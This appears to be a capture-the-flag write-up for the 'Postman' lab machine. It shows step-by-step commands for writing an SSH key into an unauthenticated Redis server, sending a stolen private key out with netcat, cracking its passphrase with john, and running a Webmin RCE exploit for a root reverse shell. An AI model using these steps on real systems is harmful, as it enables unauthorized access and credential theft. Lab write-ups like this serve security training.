## Summary

Nmap revealed that there is Redis server running on port 6379. This server allows connection without credentials. By trying different Redis attack vectors I was able to gain unauthorized SSH access to the server. Enumerating system as user `redis` I found  backup of Matts private key in `/opt` directory.  I transferred key to my attacking machine and used `ssh2john` to extract hash which was subsequently cracked via `john`. With this password I was able to `su` as user `Matt`. In the process of enumeration as user `Matt` I ran `pspy64s` to see processes running on the system. This revealed that `Webmin 1.910` on port 10000 is running with root privileges. This exact version of `Webmin` is vulnerable to authenticated RCE. By exploiting this vulnerability with credentials for user `Matt` it is possible to obtain reverse shell with root privileges

### Nmap

```

```

## Enumeration

### Service Enumeration

| **IP Address** | **Ports Open** |
|-------|--------|
| 10.10.11.180 | **TCP**: 22, 80, 6379, 10000 |

#### Port 80 (http)

##### Technology

```
Apache httpd 2.4.29
```

##### Website

The front page of website reveals possible host name `Postman`. I added it to `/etc/passwd` with `postman.htb`.

![80.png](/assets/img/Postman/80.png)

```
sudo sh -c 'echo "10.10.10.160 Postman postman.htb" >> /etc/hosts'
```

##### Web Content Discovery

```
dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql -u http://postman.htb
```

![dirsearch.png](/assets/img/Postman/dirsearch.png)

#### Port 6379 (redis)

##### Technology

```
Redis key-value store 4.0.9
```

##### Redis Enumeration

Redis server allows connection without credentials. 

```
redis-cli -h 10.10.10.160
```

![redisCli.png](/assets/img/Postman/redisCli.png)

#### Port 10000 (https)

##### Technology

```
MiniServ 1.910 - Webmin 
```

![10000.png](/assets/img/Postman/10000.png)

Searching for vulnerabilities that impact `Webmin` 1.910, I found out that this exact version is vulnerable to authenticated RCE. I tried few default credentials but none of them were valid. It is interesting find and something which could be later exploitable after obtaining some credentials.

## Exploitation

### Unauthorized SSH Access via Redis Exploitation

By trying different Redis attack vectors I was able to gain unauthorized SSH access to the server by reproducing exploitation method from this [article](https://hackviser.com/tactics/pentesting/services/redis) 

First we need to generate ssh key pair and write the contents of public key to a file. 

```
ssh-keygen -t rsa
```

```
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```

Next we import the file with contents of public key into redis.

```
cat key.txt | redis-cli -h postman.htb -x set ssh_key
```

https://stackoverflow.com/questions/19581059/misconf-redis-is-configured-to-save-rdb-snapshots

Running this command caused error. I was able to resolve this error after quick googling that lead to finding answer on [stackoverflow](https://stackoverflow.com/questions/19581059/misconf-redis-is-configured-to-save-rdb-snapshots).

![error2.png](/assets/img/Postman/error2.png)

UsingÂ `redis-cli`, it is possible edit config to get rid off this error. 

```
config set stop-writes-on-bgsave-error no
```

![errorSolve.png](/assets/img/Postman/errorSolve.png)

Now we can continue to save the public key to the `authorized_keys` file on redis server.

```
config set dir /var/lib/redis/.ssh
```

```
config set dbfilename "authorized_keys"
```

![exploit.png](/assets/img/Postman/exploit.png)

### Initial Foothold

Now we can `ssh` to redis server with previously generated private key.  

```
ssh -i id_rsa redis@10.10.10.160
```

## Post Exploitation

### Information Gathering
#### Linpeas

Running `linpeas.sh` revealed some unusual files in `/var/www/html` directory.

![lin1.png](/assets/img/Postman/lin1.png)

Another interesting file is located in `/opt` directory and is owned by user Matt. It seems like it is backup of Matts private key. 

![lin2.png](/assets/img/Postman/lin2.png)

### Lateral Movement

By inspecting contents this file we can confirm that it is in fact private key.

![idRsaBak.png](/assets/img/Postman/idRsaBak.png)

I transferred this file to my attacking machine via `Netcat`. 

On victim machine:
```
nc -w 3 10.10.14.4 9989 < id_rsa.bak
```

On the receiving end:
```
nc -nlvp 9989 > matt_rsa
```

![fileTransfer.png](/assets/img/Postman/fileTransfer.png)

Now we can try to login as user Matt via `SSH`.

```
chmod 600 matt_rsa
```

```
ssh -i matt_rsa Matt@postman.htb
```

![sshPassphrase2.png](/assets/img/Postman/sshPassphrase2.png)

Unfortunately we need passphrase to be able to log in. We can convert private key into a hash and obtain the password by subsequently cracking hash. First I used `ssh2john` from John the Ripper suite which transforms SSH private keys to john format hash suitable for cracking by `john` which is also part of JTR suite. 

```
ssh2john matt_rsa > matt_hash
```

Next I cracked password by using `john`

```
john matt_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/assets/img/Postman/john.png)

```
computer2008
```

With this password we can `su` as user Matt. 

![suMatt.png](/assets/img/Postman/suMatt.png)

### User Flag

![userFlag.png](/assets/img/Postman/userFlag.png)

### Privilege Escalation

#### pspy64s

Running `pspy64s` revealed that Webmin on port 10000 found by `nmap` is running with root privileges. 

![pspy64s.png](/assets/img/Postman/pspy64s.png)

```
/usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

This means that if we could perform exploit for authenticated RCE which was found during enumeration phase, we would get shell as root. We could not exploit this due to lack of credentials but now we have valid credentials for user `Matt`.

With these credentials I was able to log in `Webmin` on port 10000. 

![webminLogin.png](/assets/img/Postman/webminLogin.png)

![dashboard.png](/assets/img/Postman/dashboard.png)

Now that we have valid credentials for Webmin we can use this [exploit](https://github.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE/blob/master/exploit_poc.py) to obtain reverse shell. 

```
python3 exploit_poc.py --ip_address=10.10.10.160 --port=10000 --lhost=10.10.14.4 --lport=7007 --user=Matt --pass=computer2008
```
